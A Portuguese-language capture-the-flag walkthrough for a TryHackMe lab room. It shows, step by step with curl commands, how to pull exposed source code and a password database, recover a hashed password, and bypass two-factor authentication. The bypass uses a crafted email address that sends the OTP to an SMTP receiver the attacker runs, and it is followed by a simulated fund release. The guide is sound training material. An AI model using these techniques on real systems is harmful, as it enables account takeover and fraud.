# Side Quest 4 - BreachBlocker Unlocker

Este guia acompanha a sala [BreachBlocker Unlocker](https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK). Inicie a Lab Machine e use uma máquina Linux própria conectada à VPN ou a AttackBox do TryHackMe. Recomendamos a máquina própria para conservar histórico, arquivos e ferramentas entre sessões; veja as [opções de conexão](../../../README.md#máquina-local-conectada-à-vpn). Os procedimentos abaixo foram executados no laboratório; substitua o IP pelo endereço da sua instância.

```bash
export IP=10.x.x.x
mkdir -p sq4 && cd sq4
nmap -Pn -sT -n -sV -p- --open "$IP"
```

A aplicação HTTPS do celular responde na porta `8443`; as portas `22` e `25` também ficam abertas.

## 1. Ler o código exposto pela aplicação

O servidor permite acessar arquivos fora das rotas normais da interface. Consulte `nginx.conf` para entender o encaminhamento ao aplicativo Python e, em seguida, solicite `main.py` diretamente:

```bash
curl -ks "https://$IP:8443/nginx.conf" -o nginx.conf
curl -ks "https://$IP:8443/main.py" -o main.py
grep -nE 'FLAG|check-credentials|bank-login|send-2fa|verify-2fa|release-funds' main.py
```

Um comentário no código revela a primeira flag. O código também mostra como a autenticação Hopflix funciona e quais endpoints liberam as etapas seguintes.

Resposta: `THM{...}`

## 2. Recuperar a senha do Hopflix

O banco SQLite está disponível em um caminho inesperado. As duas barras iniciais são importantes para reproduzir a requisição que usamos no laboratório:

```bash
curl -ks "https://$IP:8443//hopflix-874297.db" -o hopflix.db
file hopflix.db
sqlite3 hopflix.db '.tables'
sqlite3 hopflix.db 'SELECT email,length(password_hash) FROM users;'
```

O campo `password_hash` reúne vários hashes SHA-1 de 40 caracteres: cada trecho representa um caractere da senha, calculado com várias iterações. O código da aplicação sugere 5.000 iterações, mas a base obtida no laboratório corresponde a 1.000. Para recuperar os caracteres por comparação local, use o [script que criamos para esta sala](scripts/recuperar_senha_hopflix.py):

```bash
git clone https://github.com/RenatoCDM/guias-tryhackme-ptbr.git
python3 guias-tryhackme-ptbr/series/advent-of-cyber/advent-of-cyber-2025-sidequest/scripts/recuperar_senha_hopflix.py hopflix.db
```

O comando imprime o e-mail e a senha recuperada. Autentique-se na API e mantenha o cookie da sessão:

```bash
export EMAIL='<EMAIL_RECUPERADO>'
export PASS='<SENHA_RECUPERADA>'
curl -ks -c cookies.txt -X POST "https://$IP:8443/api/check-credentials" \
  -H 'Content-Type: application/json' \
  --data-binary "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}"
curl -ks -b cookies.txt "https://$IP:8443/api/get-last-viewed"
```

O último título assistido contém a segunda flag.

Resposta: `THM{...}`

## 3. Iniciar a sessão do banco

O código de `main.py` mostra que o banco reaproveita o e-mail e a senha como `account_id` e `pin`. Faça o login usando o mesmo cookie:

```bash
curl -ks -b cookies.txt -c cookies.txt -X POST \
  "https://$IP:8443/api/bank-login" \
  -H 'Content-Type: application/json' \
  --data-binary "{\"account_id\":\"$EMAIL\",\"pin\":\"$PASS\"}"
```

Leia no código a lógica do endpoint `/api/send-2fa`. Ele valida o domínio usando a parte após o último `@`, mas a biblioteca de e-mail interpreta o endereço de outra forma. Um endereço com um literal de IP antes do último `@` passa pela validação e desvia a mensagem para o servidor SMTP da sua máquina VPN.

Inicie um receptor SMTP no IP da interface VPN, porta 25. Um exemplo mínimo:

```python
# receber_otp.py
import asyncio
from aiosmtpd.controller import Controller

class Receiver:
    async def handle_DATA(self, server, session, envelope):
        print(envelope.content.decode(errors="replace"), flush=True)
        return "250 OK"

controller = Controller(Receiver(), hostname="0.0.0.0", port=25)
controller.start()
asyncio.get_event_loop().run_forever()
```

```bash
sudo python3 receber_otp.py
ip -4 addr show tun0
```

Em outra sessão, ajuste o IP e solicite o código:

```bash
export VPN_IP='<SEU_IP_DA_VPN>'
curl -ks -b cookies.txt -c cookies.txt -X POST \
  "https://$IP:8443/api/send-2fa" \
  -H 'Content-Type: application/json' \
  --data-binary "{\"otp_email\":\"analyst@[$VPN_IP](@easterbunnies.thm\"}"
```

Leia o OTP recebido no terminal do SMTP e confirme-o na mesma sessão:

```bash
export OTP='<CODIGO_RECEBIDO>'
curl -ks -b cookies.txt -c cookies.txt -X POST \
  "https://$IP:8443/api/verify-2fa" \
  -H 'Content-Type: application/json' \
  --data-binary "{\"code\":\"$OTP\"}"
```

## 4. Liberar os fundos simulados

Com o segundo fator verificado, acione o endpoint final dentro da simulação da sala:

```bash
curl -ks -b cookies.txt -X POST \
  "https://$IP:8443/api/release-funds" \
  -H 'Content-Type: application/json' -d '{}'
```

A resposta traz a terceira flag. Envie as três flags na página do TryHackMe, espere alguns segundos entre respostas e confirme o progresso de 100%.

Resposta: `THM{...}`
